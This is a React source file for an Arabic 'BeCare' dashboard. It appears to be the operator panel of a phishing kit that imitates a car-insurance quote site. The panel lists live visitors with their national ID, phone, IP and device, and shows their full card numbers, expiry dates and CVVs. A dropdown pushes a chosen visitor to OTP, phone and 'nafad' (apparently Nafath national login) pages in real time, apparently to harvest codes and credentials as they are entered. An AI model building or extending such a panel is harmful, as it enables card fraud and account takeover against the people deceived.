import { useEffect, useMemo, useState } from "react";
import { addData } from "@/lib/api";

type RequestItem = {
  id: string;
  customer: string;
  status: string;
  stage: string;
  updated: string;
  badge?: string;
  visitorId?: string;
  submittedAt?: string;
  hasCard?: boolean;
  raw?: Record<string, any>;
};

// Country flags mapping
const countryFlags: Record<string, string> = {
  sa: "🇸🇦",
  ksa: "🇸🇦",
  saudi: "🇸🇦",
  "saudi arabia": "🇸🇦",
  السعودية: "🇸🇦",
  jo: "🇯🇴",
  jord: "🇯🇴",
  jordan: "🇯🇴",
  الأردن: "🇯🇴",
  ae: "🇦🇪",
  uae: "🇦🇪",
  emirates: "🇦🇪",
  الإمارات: "🇦🇪",
  eg: "🇪🇬",
  egy: "🇪🇬",
  egypt: "🇪🇬",
  مصر: "🇪🇬",
  om: "🇴🇲",
  oman: "🇴🇲",
  سلطنة_عمران: "🇴🇲",
  lb: "🇱🇧",
  lebanon: "🇱🇧",
  لبنان: "🇱🇧",
  sy: "🇸🇾",
  syr: "🇸🇾",
  syria: "🇸🇾",
  سوريا: "🇸🇾",
};

const countryCodes: Record<string, string> = {
  sa: "SA",
  ksa: "SA",
  jo: "JO",
  ae: "AE",
  eg: "EG",
  om: "OM",
  lb: "LB",
  sy: "SY",
};

const fallbackRequests: RequestItem[] = [
  { id: "REQ-1001", customer: "أحمد السالم", status: "جديد", stage: "الرئيسية", updated: "منذ 5 دقائق", badge: "new" },
  { id: "REQ-1002", customer: "سارة القحطاني", status: "قيد المعالجة", stage: "الدفع", updated: "منذ 12 دقيقة", badge: "pending" },
  { id: "REQ-1003", customer: "خالد العنزي", status: "مكتمل", stage: "التأمين", updated: "منذ 28 دقيقة", badge: "completed" },
  { id: "REQ-1004", customer: "نورا الرشيدي", status: "محظور", stage: "مقارنة", updated: "منذ 40 دقيقة", badge: "blocked" },
];

export default function DashboardPage() {
  const [requests, setRequests] = useState<RequestItem[]>(fallbackRequests);
  const [selectedRequestId, setSelectedRequestId] = useState<string | null>(fallbackRequests[0]?.id ?? null);
  const [searchQuery, setSearchQuery] = useState("");
  const [filterMode, setFilterMode] = useState<"all" | "cards">("all");
  const [flowDropdownOpen, setFlowDropdownOpen] = useState(false);
  const [selectedFlowStep, setSelectedFlowStep] = useState("home");
  const [nowTick, setNowTick] = useState<number>(Date.now());

  // Stats
  const stats = useMemo(() => {
    const total = requests.length;
    const newCount = requests.filter((r) => r.badge === "new").length;
    const pendingCount = requests.filter((r) => r.badge === "pending").length;
    const completedCount = requests.filter((r) => r.badge === "completed").length;
    return { total, newCount, pendingCount, completedCount };
  }, [requests]);

  // Load requests from API
  const loadRequests = () => {
    fetch("/api/dashboard/requests")
      .then((res) => res.json())
      .then((data) => {
        if (Array.isArray(data)) {
          setRequests(data);
        }
      })
      .catch(() => {});
  };

  useEffect(() => {
    loadRequests();
    const interval = setInterval(loadRequests, 5000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => setNowTick(Date.now()), 60000);
    return () => clearInterval(timer);
  }, []);

  // Get country flag
  const getCountryFlag = (raw?: Record<string, any>): string => {
    if (!raw) return "🌐";
    const country = raw.country || raw.countryCode || raw.countryName || raw.location?.country || "";
    const normalized = String(country).toLowerCase().trim();
    for (const [key, flag] of Object.entries(countryFlags)) {
      if (normalized.includes(key)) return flag;
    }
    return "🌐";
  };

  // Get country code
  const getCountryCode = (raw?: Record<string, any>): string => {
    if (!raw) return "—";
    const country = raw.country || raw.countryCode || "";
    const normalized = String(country).toLowerCase().trim();
    for (const [key, code] of Object.entries(countryCodes)) {
      if (normalized.includes(key)) return code;
    }
    return normalized.slice(0, 2).toUpperCase() || "—";
  };

  // Get device icon
  const getDeviceIcon = (raw?: Record<string, any>): string => {
    if (!raw) return "📱";
    const device = String(raw.deviceType || raw.device || raw.platform || "").toLowerCase();
    if (/ipad|tablet/i.test(device)) return "💻";
    if (/desktop|pc/i.test(device)) return "🖥️";
    if (/phone|mobile|android|iphone/i.test(device)) return "📱";
    return "📱";
  };

  // Filter requests
  const filteredRequests = useMemo(() => {
    let filtered = requests;
    if (filterMode === "cards") {
      filtered = requests.filter((r) => r.hasCard);
    }
    if (searchQuery.trim()) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter(
        (r) =>
          r.customer.toLowerCase().includes(query) ||
          r.id.toLowerCase().includes(query) ||
          r.raw?.phoneNumber?.toString().includes(query) ||
          r.raw?.identityNumber?.toString().includes(query)
      );
    }
    return filtered;
  }, [requests, filterMode, searchQuery]);

  const selectedRequest = requests.find((r) => r.id === selectedRequestId) ?? requests[0];

  // Handle flow selection
  const handleFlowSelect = async (step: string) => {
    const visitorId = selectedRequest?.visitorId || selectedRequest?.raw?.visitorId;
    if (!visitorId) return;
    setSelectedFlowStep(step);
    setFlowDropdownOpen(false);

    const flowTargets: Record<string, { redirectPage: string; currentPage: string; currentStep: number }> = {
      home: { redirectPage: "home", currentPage: "home", currentStep: 1 },
      insurance: { redirectPage: "insur", currentPage: "insur", currentStep: 2 },
      package: { redirectPage: "compar", currentPage: "compar", currentStep: 3 },
      payment: { redirectPage: "check", currentPage: "check", currentStep: 4 },
      verification: { redirectPage: "otp", currentPage: "otp", currentStep: 5 },
      phone: { redirectPage: "phone", currentPage: "phone", currentStep: 6 },
      access: { redirectPage: "nafad", currentPage: "nafad", currentStep: 7 },
    };

    const target = flowTargets[step];
    if (target) {
      await addData({
        id: visitorId,
        ...target,
      });
    }
  };

  // Flow options
  const flowOptions = [
    { value: "home", label: "الصفحة الرئيسية" },
    { value: "insurance", label: "بيانات التأمين" },
    { value: "package", label: "مقارنة العروض" },
    { value: "payment", label: "الدفع والتحقق" },
    { value: "verification", label: "التحقق OTP" },
    { value: "phone", label: "معلومات الهاتف" },
    { value: "access", label: "النفاذ" },
  ];

  const selectedFlowLabel = flowOptions.find((f) => f.value === selectedFlowStep)?.label || "توجيه الزائر...";

  return (
    <div style={{ minHeight: "100vh", background: "#f8fafc", fontFamily: "Tahoma, Arial, sans-serif" }} dir="rtl">
      {/* Header */}
      <header
        style={{
          display: "flex",
          alignItems: "center",
          height: 54,
          padding: "0 12px",
          background: "#ffffff",
          borderBottom: "1px solid #e5e7eb",
          position: "sticky",
          top: 0,
          zIndex: 100,
        }}
      >
        {/* Logo */}
        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <div
            style={{
              width: 28,
              height: 28,
              borderRadius: 6,
              background: "linear-gradient(135deg, #22c55e, #15803d)",
              display: "grid",
              placeItems: "center",
              fontWeight: 900,
              fontSize: "0.8rem",
              color: "#fff",
            }}
          >
            B
          </div>
          <span style={{ color: "#111827", fontWeight: 800, fontSize: "0.9rem", letterSpacing: "0.04em" }}>BeCare</span>
        </div>

        {/* Stats */}
        <div style={{ display: "flex", alignItems: "center", gap: 0, marginRight: "auto", overflowX: "auto" }}>
          {/* Live indicator */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderRight: "1px solid #e5e7eb" }}>
            <span
              style={{
                width: 8,
                height: 8,
                borderRadius: "50%",
                background: "#4ade80",
                boxShadow: "0 0 0 4px rgba(74, 222, 128, 0.2)",
              }}
            />
            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.newCount}</span>
          </div>

          {/* Today */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderRight: "1px solid #e5e7eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2">
              <path d="M16 7h6v6M22 7L12 17l-5-5L2 17" />
            </svg>
            <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>اليوم</span>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.total}</span>
          </div>

          {/* Total */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderRight: "1px solid #e5e7eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2">
              <circle cx="12" cy="12" r="10" />
              <path d="M2 12h20M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" />
            </svg>
            <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>إجمالي</span>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.total}</span>
          </div>

          {/* Cards */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderRight: "1px solid #e5e7eb", color: "#2563eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <rect width="20" height="14" x="2" y="5" rx="2" />
              <line x1="2" x2="22" y1="10" y2="10" />
            </svg>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.completedCount}</span>
          </div>

          {/* Visitors */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", color: "#16a34a" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
              <circle cx="9" cy="7" r="4" />
              <path d="M22 21v-2a4 4 0 0 0-3-3.87M16 3.13a4 4 0 0 1 0 7.75" />
            </svg>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.newCount}</span>
          </div>
        </div>

        {/* User */}
        <div style={{ display: "flex", alignItems: "center", gap: 6, marginRight: 8, paddingRight: 8, borderRight: "1px solid #e5e7eb" }}>
          <div
            style={{
              width: 28,
              height: 28,
              borderRadius: "50%",
              background: "linear-gradient(135deg, #3b82f6, #7c3aed)",
              display: "grid",
              placeItems: "center",
              color: "#fff",
              fontWeight: 700,
              fontSize: "0.8rem",
            }}
          >
            A
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div style={{ display: "flex", minHeight: "calc(100vh - 54px)" }}>
        {/* Sidebar - Visitor List */}
        <aside
          style={{
            width: 340,
            background: "#ffffff",
            borderLeft: "1px solid #e5e7eb",
            display: "flex",
            flexDirection: "column",
            maxHeight: "calc(100vh - 54px)",
            overflow: "hidden",
          }}
        >
          {/* Search and Filters */}
          <div style={{ padding: 12, borderBottom: "1px solid #e5e7eb" }}>
            {/* Filter buttons */}
            <div style={{ display: "flex", gap: 8, marginBottom: 12 }}>
              <button
                onClick={() => setFilterMode("all")}
                style={{
                  flex: 1,
                  padding: "8px 12px",
                  border: filterMode === "all" ? "1px solid #22c55e" : "1px solid #e5e7eb",
                  borderRadius: 8,
                  background: filterMode === "all" ? "#f0fdf4" : "#fff",
                  color: filterMode === "all" ? "#16a34a" : "#6b7280",
                  fontWeight: 600,
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                الكل ({requests.length})
              </button>
              <button
                onClick={() => setFilterMode("cards")}
                style={{
                  flex: 1,
                  padding: "8px 12px",
                  border: filterMode === "cards" ? "1px solid #22c55e" : "1px solid #e5e7eb",
                  borderRadius: 8,
                  background: filterMode === "cards" ? "#f0fdf4" : "#fff",
                  color: filterMode === "cards" ? "#16a34a" : "#6b7280",
                  fontWeight: 600,
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                بطاقة ({stats.completedCount})
              </button>
            </div>

            {/* Search */}
            <div style={{ position: "relative" }}>
              <svg
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#9ca3af"
                strokeWidth="2"
                style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)" }}
              >
                <circle cx="11" cy="11" r="8" />
                <path d="m21 21-4.3-4.3" />
              </svg>
              <input
                type="text"
                placeholder="بحث (الاسم، الهوية، الهاتف)"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                style={{
                  width: "100%",
                  padding: "10px 12px 10px 36px",
                  border: "1px solid #e5e7eb",
                  borderRadius: 8,
                  fontSize: "0.85rem",
                  outline: "none",
                }}
              />
            </div>
          </div>

          {/* Visitor List */}
          <div style={{ flex: 1, overflowY: "auto" }}>
            {filteredRequests.map((item) => (
              <div
                key={item.id}
                onClick={() => setSelectedRequestId(item.id)}
                style={{
                  padding: "12px 16px",
                  borderBottom: "1px solid #f3f4f6",
                  background: selectedRequestId === item.id ? "#f0f9ff" : "#fff",
                  cursor: "pointer",
                  transition: "background 0.2s",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 4 }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    <span style={{ fontSize: "1.2rem" }}>{getCountryFlag(item.raw)}</span>
                    <span style={{ fontWeight: 700, fontSize: "0.9rem", color: "#111827" }}>{item.customer}</span>
                  </div>
                  <span style={{ fontSize: "0.75rem", color: "#6b7280" }}>{item.updated}</span>
                </div>
                <div
                  style={{
                    display: "inline-block",
                    padding: "2px 10px",
                    borderRadius: 4,
                    fontSize: "0.75rem",
                    fontWeight: 600,
                    background:
                      item.stage === "الدفع"
                        ? "#dbeafe"
                        : item.stage === "التأمين"
                          ? "#fef3c7"
                          : item.stage === "مقارنة"
                            ? "#f3e8ff"
                            : item.stage === "OTP"
                              ? "#fee2e2"
                              : "#e0f2fe",
                    color:
                      item.stage === "الدفع"
                        ? "#2563eb"
                        : item.stage === "التأمين"
                          ? "#d97706"
                          : item.stage === "مقارنة"
                            ? "#9333ea"
                            : item.stage === "OTP"
                              ? "#dc2626"
                              : "#0284c7",
                  }}
                >
                  {item.stage}
                </div>
              </div>
            ))}
            {filteredRequests.length === 0 && (
              <div style={{ padding: 24, textAlign: "center", color: "#6b7280" }}>لا توجد نتائج</div>
            )}
          </div>
        </aside>

        {/* Main Panel - Client Details */}
        <main style={{ flex: 1, padding: 20, overflowY: "auto" }}>
          {selectedRequest && (
            <div style={{ maxWidth: 800 }}>
              {/* Client Header */}
              <div
                style={{
                  background: "#ffffff",
                  borderRadius: 12,
                  padding: 16,
                  marginBottom: 16,
                  border: "1px solid #e5e7eb",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: 12 }}>
                  {/* Client Info */}
                  <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
                    <div
                      style={{
                        width: 48,
                        height: 48,
                        borderRadius: "50%",
                        background: "#f0f9ff",
                        display: "grid",
                        placeItems: "center",
                        fontSize: "1.5rem",
                      }}
                    >
                      {getCountryFlag(selectedRequest.raw)}
                    </div>
                    <div>
                      <h2 style={{ margin: 0, fontSize: "1.1rem", fontWeight: 700, color: "#111827" }}>{selectedRequest.customer}</h2>
                      <p style={{ margin: "4px 0 0", fontSize: "0.8rem", color: "#6b7280" }}>{selectedRequest.id}</p>
                    </div>
                  </div>

                  {/* Flow Selector */}
                  <div style={{ position: "relative" }}>
                    <button
                      onClick={() => setFlowDropdownOpen(!flowDropdownOpen)}
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: 8,
                        padding: "10px 16px",
                        border: "1px solid #e5e7eb",
                        borderRadius: 8,
                        background: "#fff",
                        cursor: "pointer",
                        fontWeight: 600,
                        fontSize: "0.85rem",
                      }}
                    >
                      {selectedFlowLabel}
                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M6 9l6 6 6-6" />
                      </svg>
                    </button>
                    {flowDropdownOpen && (
                      <div
                        style={{
                          position: "absolute",
                          top: "calc(100% + 4px)",
                          right: 0,
                          minWidth: 180,
                          background: "#fff",
                          border: "1px solid #e5e7eb",
                          borderRadius: 8,
                          boxShadow: "0 4px 12px rgba(0,0,0,0.1)",
                          zIndex: 50,
                          overflow: "hidden",
                        }}
                      >
                        {flowOptions.map((option) => (
                          <button
                            key={option.value}
                            onClick={() => handleFlowSelect(option.value)}
                            style={{
                              width: "100%",
                              padding: "10px 16px",
                              border: "none",
                              background: selectedFlowStep === option.value ? "#f0f9ff" : "#fff",
                              textAlign: "right",
                              cursor: "pointer",
                              fontWeight: selectedFlowStep === option.value ? 700 : 500,
                              color: selectedFlowStep === option.value ? "#2563eb" : "#374151",
                              fontSize: "0.85rem",
                            }}
                          >
                            {option.label}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                </div>

                {/* Device Info */}
                <div style={{ display: "flex", alignItems: "center", gap: 16, marginTop: 16, paddingTop: 16, borderTop: "1px solid #f3f4f6" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#6b7280", fontSize: "0.85rem" }}>
                    <span>{getDeviceIcon(selectedRequest.raw)}</span>
                    <span>{selectedRequest.raw?.deviceType || selectedRequest.raw?.platform || "غير معروف"}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#6b7280", fontSize: "0.85rem" }}>
                    <span>{getCountryFlag(selectedRequest.raw)}</span>
                    <span>{getCountryCode(selectedRequest.raw)}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, color: "#6b7280", fontSize: "0.85rem" }}>
                    <span>🌐</span>
                    <span>{selectedRequest.raw?.ip || "—"}</span>
                  </div>
                </div>
              </div>

              {/* Client Details Grid */}
              <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))", gap: 16 }}>
                {/* Basic Info */}
                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>معلومات أساسية</h3>
                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                    {[
                      { label: "الاسم", value: selectedRequest.customer },
                      { label: "رقم الهوية", value: selectedRequest.raw?.identityNumber || selectedRequest.raw?.buyerIdNumber },
                      { label: "رقم الهاتف", value: selectedRequest.raw?.phoneNumber },
                      { label: "نوع الوثيقة", value: selectedRequest.raw?.documentType },
                      { label: "الرقم التسلسلي", value: selectedRequest.raw?.serialNumber },
                    ].map(
                      (item) =>
                        item.value && (
                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
                          </div>
                        )
                    )}
                  </div>
                </div>

                {/* Insurance Info */}
                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تفاصيل التأمين</h3>
                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                    {[
                      { label: "نوع التغطية", value: selectedRequest.raw?.coverageType },
                      { label: "موديل المركبة", value: selectedRequest.raw?.vehicleModel },
                      { label: "سنة الصنع", value: selectedRequest.raw?.manufacturingYear },
                      { label: "استخدام المركبة", value: selectedRequest.raw?.vehicleUsage || selectedRequest.raw?.usage },
                      { label: "موقع الإصلاح", value: selectedRequest.raw?.repairLocation },
                    ].map(
                      (item) =>
                        item.value && (
                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
                          </div>
                        )
                    )}
                  </div>
                </div>

                {/* Offer Info */}
                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>العرض المختار</h3>
                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                    {[
                      { label: "الشركة", value: selectedRequest.raw?.companyName },
                      { label: "السعر الأصلي", value: selectedRequest.raw?.originalPrice },
                      { label: "الخصم", value: selectedRequest.raw?.discount },
                      { label: "السعر النهائي", value: selectedRequest.raw?.finalPrice },
                    ].map(
                      (item) =>
                        item.value && (
                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
                          </div>
                        )
                    )}
                  </div>
                </div>

                {/* Card Info */}
                <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>معلومات البطاقة</h3>
                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                    {[
                      { label: "رقم البطاقة", value: selectedRequest.raw?.cardNumber },
                      { label: "اسم مالك البطاقة", value: selectedRequest.raw?.cardOwner },
                      { label: "تاريخ الانتهاء", value: selectedRequest.raw?.cardExpiry },
                      { label: "رمز الأمان", value: selectedRequest.raw?.cvv },
                    ].map(
                      (item) =>
                        item.value && (
                          <div key={item.label} style={{ display: "flex", justifyContent: "space-between" }}>
                            <span style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</span>
                            <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111827" }}>{item.value}</span>
                          </div>
                        )
                    )}
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>
      </div>
    </div>
  );
}
